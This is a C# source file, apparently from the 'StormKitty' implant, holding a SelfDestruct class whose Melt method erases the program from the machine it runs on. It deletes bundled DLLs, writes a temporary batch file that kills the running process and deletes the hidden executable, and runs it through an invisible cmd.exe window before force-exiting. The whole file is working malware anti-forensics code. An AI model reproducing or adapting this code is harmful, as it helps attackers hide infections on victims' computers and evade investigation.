using System.IO;
using System.Diagnostics;

namespace StormKitty.Implant
{
    internal sealed class SelfDestruct
    {
        /// <summary>
        /// Delete file after first start
        /// </summary>
        public static void Melt()
        {
            // Paths
            string batch = Path.GetTempFileName() + ".bat";
            string path = System.Reflection.Assembly.GetExecutingAssembly().Location;
            int currentPid = Process.GetCurrentProcess().Id;
            // Delete library
            string dll = "DotNetZip.dll";
            string dll2 = "Newtonsoft.Json.dll";
            if (File.Exists(dll))
                try
                {
                    File.Delete(dll);
                } catch { }
            if (File.Exists(dll2))
                try
                {
                    File.Delete(dll2);
                } catch { }
            // Write batch
            using (StreamWriter sw = File.AppendText(batch))
            {
                sw.WriteLine("chcp 65001");
                sw.WriteLine("TaskKill /F /IM " + currentPid);
                sw.WriteLine("Timeout /T 2 /Nobreak");
                sw.WriteLine("Del /ah \"" + path + "\"");
            }
            // Start
            Process.Start(new ProcessStartInfo()
            {
                FileName = "cmd.exe",
                Arguments = $"/C {batch} & Del {batch}",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            });
            // Wait for exit
            System.Threading.Thread.Sleep(5000);
            System.Environment.FailFast(null);
        }
    }
}
